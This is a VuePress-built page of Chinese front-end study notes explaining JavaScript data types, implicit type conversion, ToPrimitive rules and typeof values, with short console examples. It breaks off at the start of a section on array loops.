<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>1. JS的数据类型以及隐式转换 | 首页</title>
    <meta name="generator" content="VuePress 1.9.7">
    <link rel="icon" href="/Front-end-go-on/logo.png">
    <meta name="description" content="前端记录">
    
    <link rel="preload" href="/Front-end-go-on/assets/css/0.styles.2a02a9f8.css" as="style"><link rel="preload" href="/Front-end-go-on/assets/js/app.fad555c1.js" as="script"><link rel="preload" href="/Front-end-go-on/assets/js/2.8f85e039.js" as="script"><link rel="preload" href="/Front-end-go-on/assets/js/5.092626d6.js" as="script"><link rel="prefetch" href="/Front-end-go-on/assets/js/10.e2b3ae5e.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/11.02bd59a7.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/12.04c43872.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/13.000b6409.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/14.1c9d9fcb.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/15.0cfc87ef.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/16.7b89a576.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/17.838e77cc.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/18.56b560f3.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/19.23354422.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/20.e2d5441b.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/21.6c160446.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/22.18a7de35.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/23.39afef2b.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/24.5a52475d.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/25.1778a793.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/26.32905bab.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/27.a33f09c6.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/28.a588a052.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/29.dd733fee.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/3.37c1373a.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/30.9bdf5fa6.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/31.2e6c9e10.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/32.b35c976b.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/33.d4836f8c.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/34.2c4554f1.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/35.0e09bb5d.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/36.be79a447.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/37.344ca4d1.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/38.d05da179.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/39.df86ee09.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/4.5c01ce5a.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/40.6a71d060.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/41.44e90681.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/42.67036265.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/43.b70d609c.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/44.408666f3.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/45.bd316d99.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/46.4a0bae38.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/47.592d61d9.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/48.7fba3366.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/49.60951325.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/50.1a0f7eb9.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/51.0cd50760.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/52.578fe808.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/53.83507b33.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/54.11bf35ec.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/55.a47da132.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/56.c1c48c0f.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/57.bc0e90c4.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/58.0145bbb4.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/59.537bf7a2.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/6.1693aa4e.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/60.b5f0d791.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/61.932a2c87.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/62.6dc323f1.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/63.312a242a.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/64.bab6a6c1.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/7.6e78544b.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/8.a495d134.js"><link rel="prefetch" href="/Front-end-go-on/assets/js/9.26e6b316.js">
    <link rel="stylesheet" href="/Front-end-go-on/assets/css/0.styles.2a02a9f8.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/Front-end-go-on/" class="home-link router-link-active"><img src="/Front-end-go-on/logo.png" alt="首页" class="logo"> <span class="site-name can-hide">首页</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/Front-end-go-on/pages/frontend/base/Html.html" class="nav-link">
  前端
</a></div><div class="nav-item"><a href="/Front-end-go-on/pages/otherLang/node/base.html" class="nav-link">
  非前端
</a></div><div class="nav-item"><a href="/Front-end-go-on/pages/assit/chrome/Extension.html" class="nav-link">
  辅助
</a></div><div class="nav-item"><a href="https://github.com/lll618xxx" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/Front-end-go-on/pages/frontend/base/Html.html" class="nav-link">
  前端
</a></div><div class="nav-item"><a href="/Front-end-go-on/pages/otherLang/node/base.html" class="nav-link">
  非前端
</a></div><div class="nav-item"><a href="/Front-end-go-on/pages/assit/chrome/Extension.html" class="nav-link">
  辅助
</a></div><div class="nav-item"><a href="https://github.com/lll618xxx" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>前端基础</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/Front-end-go-on/pages/frontend/base/Html.html" class="sidebar-link">HTML基础</a></li><li><a href="/Front-end-go-on/pages/frontend/base/Css.html" class="sidebar-link">CSS基础</a></li><li><a href="/Front-end-go-on/pages/frontend/base/Js.html" aria-current="page" class="active sidebar-link">JS基础</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_1-js的数据类型以及隐式转换" class="sidebar-link">1. JS的数据类型以及隐式转换</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_2-typeof-可以返回多少种值" class="sidebar-link">2. typeof 可以返回多少种值</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_3-js数组循环" class="sidebar-link">3. JS数组循环</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_4-数组高频操作总结" class="sidebar-link">4. 数组高频操作总结</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_5-字符串高频操作总结" class="sidebar-link">5. 字符串高频操作总结</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_6-script标签的属性有哪些" class="sidebar-link">6. script标签的属性有哪些</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_7-this-指向" class="sidebar-link">7. this 指向</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_8-事件执行机制" class="sidebar-link">8. 事件执行机制</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_9-原型和原型链" class="sidebar-link">9. 原型和原型链</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_10-闭包" class="sidebar-link">10. 闭包</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_11-节流和防抖" class="sidebar-link">11. 节流和防抖</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_12-settimeout-和-setinterval-的运行机制" class="sidebar-link">12. setTimeout 和 setInterval 的运行机制</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_13-js-中-new-一个对象会发生什么" class="sidebar-link">13. JS 中 new 一个对象会发生什么</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_14-跨域是什么-怎么解决" class="sidebar-link">14. 跨域是什么，怎么解决</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_15-关于-js-的堆栈和拷贝" class="sidebar-link">15. 关于 JS 的堆栈和拷贝</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_16-v8下的垃圾回收机制" class="sidebar-link">16. V8下的垃圾回收机制</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_17-内存泄漏是什么" class="sidebar-link">17. 内存泄漏是什么</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_18-作用域链" class="sidebar-link">18. 作用域链</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_19-call、apply-和-bind-的理解" class="sidebar-link">19. call、apply 和 bind 的理解</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_20-web-安全" class="sidebar-link">20. WEB 安全</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_21-cookies-sessionstorage-和-localstorage-的区别" class="sidebar-link">21.cookies，sessionStorage 和 localStorage 的区别</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_22-事件绑定-3-种方法" class="sidebar-link">22. 事件绑定 3 种方法</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_23-事件冒泡、捕获和阻止" class="sidebar-link">23. 事件冒泡、捕获和阻止</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_24-事件委托" class="sidebar-link">24. 事件委托</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_25-dom-事件中-currenttarget-和-target-的区别" class="sidebar-link">25. dom 事件中 currentTarget 和 target 的区别</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_26-js-继承方式总结" class="sidebar-link">26. jS 继承方式总结</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_27-js创建对象的几种方式" class="sidebar-link">27. JS创建对象的几种方式</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_28-js-模块化方案" class="sidebar-link">28. JS 模块化方案</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_29-documen-write-和-innerhtml-的区别" class="sidebar-link">29. documen.write 和 innerHTML 的区别</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_30-0-1-0-2-0-3" class="sidebar-link">30. 0.1 + 0.2 != 0.3</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_31-性能定义和性能优化" class="sidebar-link">31. 性能定义和性能优化</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_32-尾调用及其好处" class="sidebar-link">32. 尾调用及其好处</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_33-​​indexeddb​​-以及-service-worker-cache-api​" class="sidebar-link">33.​​IndexedDB​​ 以及 Service Worker + Cache API​</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_34-预解析" class="sidebar-link">34. 预解析</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_35-十进制与其他进制的相互转换" class="sidebar-link">35. 十进制与其他进制的相互转换</a></li><li class="sidebar-sub-header"><a href="/Front-end-go-on/pages/frontend/base/Js.html#_36-判断变量方法归纳" class="sidebar-link">36. 判断变量方法归纳</a></li></ul></li><li><a href="/Front-end-go-on/pages/frontend/base/ES6.html" class="sidebar-link">ES6基础</a></li><li><a href="/Front-end-go-on/pages/frontend/base/Http.html" class="sidebar-link">HTTP基础</a></li><li><a href="/Front-end-go-on/pages/frontend/base/Cache.html" class="sidebar-link">前端缓存</a></li><li><a href="/Front-end-go-on/pages/frontend/base/Performance.html" class="sidebar-link">页面性能</a></li><li><a href="/Front-end-go-on/pages/frontend/base/Algorithm.html" class="sidebar-link">数据结构基础</a></li><li><a href="/Front-end-go-on/pages/frontend/base/MyArticle.html" class="sidebar-link">我的文章</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>前端进阶</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/Front-end-go-on/pages/frontend/frame/base/Vue.html" class="sidebar-link">Vue2基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/advanced/Vue.html" class="sidebar-link">Vue2进阶</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/Vue3.html" class="sidebar-link">Vue3基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/advanced/Vue3.html" class="sidebar-link">Vue3进阶</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/React.html" class="sidebar-link">React基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/advanced/React.html" class="sidebar-link">React进阶</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/advanced/React18.html" class="sidebar-link">React18新特性</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/VueVsReact.html" class="sidebar-link">Vue和React对比</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/RN.html" class="sidebar-link">RN基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/RNEnv.html" class="sidebar-link">RN环境搭建和打包</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/Packaging.html" class="sidebar-link">打包工具</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/Ts.html" class="sidebar-link">TS基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/Nuxt.html" class="sidebar-link">Nuxt基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/Applet.html" class="sidebar-link">小程序基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/MicroFrontend.html" class="sidebar-link">微前端基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/UniApp.html" class="sidebar-link">uni-app基础</a></li><li><a href="/Front-end-go-on/pages/frontend/frame/base/Business.html" class="sidebar-link">业务相关</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>前端代码练习</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/Front-end-go-on/pages/frontend/exercise/Css.html" class="sidebar-link">CSS代码练习</a></li><li><a href="/Front-end-go-on/pages/frontend/exercise/Js.html" class="sidebar-link">JS代码练习</a></li><li><a href="/Front-end-go-on/pages/frontend/exercise/Algorithm.html" class="sidebar-link">算法代码练习</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>前端代码技巧</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/Front-end-go-on/pages/frontend/skill/Tools.html" class="sidebar-link">工具库</a></li><li><a href="/Front-end-go-on/pages/frontend/skill/Utils.html" class="sidebar-link">工具函数</a></li><li><a href="/Front-end-go-on/pages/frontend/skill/CSSAnimation.html" class="sidebar-link">CSS动画库</a></li><li><a href="/Front-end-go-on/pages/frontend/skill/Css.html" class="sidebar-link">CSS代码技巧</a></li><li><a href="/Front-end-go-on/pages/frontend/skill/Js.html" class="sidebar-link">JS代码技巧</a></li><li><a href="/Front-end-go-on/pages/frontend/skill/Project.html" class="sidebar-link">项目技巧</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h2 id="_1-js的数据类型以及隐式转换"><a href="#_1-js的数据类型以及隐式转换" class="header-anchor">#</a> 1. JS的数据类型以及隐式转换</h2> <p><strong>6 种简单数据类型</strong>：<code>undefined</code>、<code>null</code>、<code>boolean</code>、<code>number</code>、<code>string</code> 和 <code>symbol(ES6) </code>(表示独一无二的值，可以保证属性不重名)<br> <strong>1 种复杂的数据类型</strong>：<code>Object</code></p> <p><strong>栈(stack)：原始数据类型</strong>：<code>String</code>，<code>Boolean</code>，<code>Number</code>，<code>Null</code>，<code>Undefined</code>占据空间小、大小固定
<strong>堆(heap)：引用数据类型</strong>：<code>Object(Array, Date, RegExp, Function)</code>占据空间大、大小不固定</p> <h4 id="boolean、number、string-这三个是-javascript-中的基本包装类型-也就是这三个其实是一个构造函数-他们是-function-的实例-是引用类型"><a href="#boolean、number、string-这三个是-javascript-中的基本包装类型-也就是这三个其实是一个构造函数-他们是-function-的实例-是引用类型" class="header-anchor">#</a> Boolean、Number、String 这三个是 Javascript 中的基本包装类型，也就是这三个其实是一个构造函数，他们是 Function 的实例，是引用类型</h4> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>需要注意的是 typeof null 返回为 object，因为特殊值 null 被认为是一个空的对象引用。undefined 值是派生自 null 值的，因此 ECMA-262 规定对它们的相等性测试要返回 true</p></div> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">undefined</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="隐式转换"><a href="#隐式转换" class="header-anchor">#</a> 隐式转换</h3> <h4 id="常见隐式转换场景"><a href="#常见隐式转换场景" class="header-anchor">#</a> 常见隐式转换场景</h4> <ul><li><ol><li>算术运算符</li></ol></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">&quot;2&quot;</span>     <span class="token comment">// &quot;12&quot; (字符串拼接)</span>
<span class="token number">1</span> <span class="token operator">-</span> <span class="token string">&quot;2&quot;</span>     <span class="token comment">// -1 (数字运算)</span>
<span class="token string">&quot;3&quot;</span> <span class="token operator">*</span> <span class="token string">&quot;4&quot;</span>   <span class="token comment">// 12 (数字运算)</span>
<span class="token string">&quot;5&quot;</span> <span class="token operator">/</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment">// Infinity ([]→0)</span>
<span class="token operator">+</span><span class="token string">&quot;1.23&quot;</span>     <span class="token comment">// 1.23 (一元+转数字)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><ul><li><ol start="2"><li>比较运算符</li></ol></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;22&quot;</span> <span class="token operator">==</span> <span class="token number">22</span>   <span class="token comment">// true (字符串转数字)</span>
<span class="token keyword">null</span> <span class="token operator">==</span> <span class="token keyword">undefined</span> <span class="token comment">// true (特殊规则)</span>
<span class="token keyword">null</span> <span class="token operator">==</span> <span class="token number">0</span>    <span class="token comment">// false (null只等于undefined)</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span>     <span class="token comment">// true (数组调用valueOf()→toString()→&quot;1&quot;→1)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>转换流程</p> <img src="/Front-end-go-on/assets/img/==.78d03f54.png" style="height:900px;"> <p><strong>ToPrimitive（对象到原始值的转换）的规则</strong></p> <ol><li><code>valueOf()</code> 方法：首先尝试调用对象的 <code>valueOf()</code> 方法。如果返回一个原始值，则直接使用该值。</li> <li><code>toString()</code> 方法：如果 <code>valueOf()</code> 方法返回的不是原始值，则尝试调用 <code>toString()</code> 方法。如果返回的是原始值，则使用该值。
如果上述两个方法都没有返回原始值，则会抛出一个 <code>TypeError</code> 异常。</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token number">42</span><span class="token punctuation">,</span>
  <span class="token function-variable function">toString</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'objString'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">valueOf</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">42</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用了 + 运算符，首先调用 valueOf() 方法，得到 42，因此输出为 42</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用了 + ''，首先调用 valueOf() 方法，得到 42，然后转换为字符串 '42'</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 显式调用 String()，首先调用 toString() 方法，得到 'objString'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><ul><li><ol start="3"><li>逻辑运算符</li></ol></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token number">0</span> <span class="token operator">||</span> <span class="token string">&quot;default&quot;</span>  <span class="token comment">// &quot;default&quot; (0→false)</span>
<span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token string">&quot;yes&quot;</span>      <span class="token comment">// &quot;yes&quot; (短路运算)</span>
<span class="token operator">!</span><span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token comment">// false (对象→true→取反)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_2-typeof-可以返回多少种值"><a href="#_2-typeof-可以返回多少种值" class="header-anchor">#</a> 2. typeof 可以返回多少种值</h2> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token string">&quot;d&quot;</span><span class="token punctuation">;</span> <span class="token comment">// string</span>
<span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token number">3232</span><span class="token punctuation">;</span> <span class="token comment">// number</span>
<span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">&quot;dd&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// object</span>
<span class="token keyword">let</span> un <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
<span class="token keyword">let</span> bool <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// boolean</span>
<span class="token keyword">function</span> <span class="token function">aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">// function</span>
<span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;sym&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// symbol (ES6)</span>
<span class="token number">42n</span><span class="token punctuation">;</span> <span class="token comment">// ​&quot;bigint&quot;​​ - 大整数（ES2020 新增）</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="_3-js数组循环"><a href="#_3-js数组循环" class="header-anchor">#</a> 3. JS数组循环</h2> <p>前置公共代码</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">delay <span class="token operator">=</span> <span class="token number">1000</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 为了验证是否真的异步</span>
<span class="token keyword">function</span> <span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> timestampInMilliseconds <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> timestampInSeconds <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>timestampInMilliseconds <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> timestampInSeconds<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
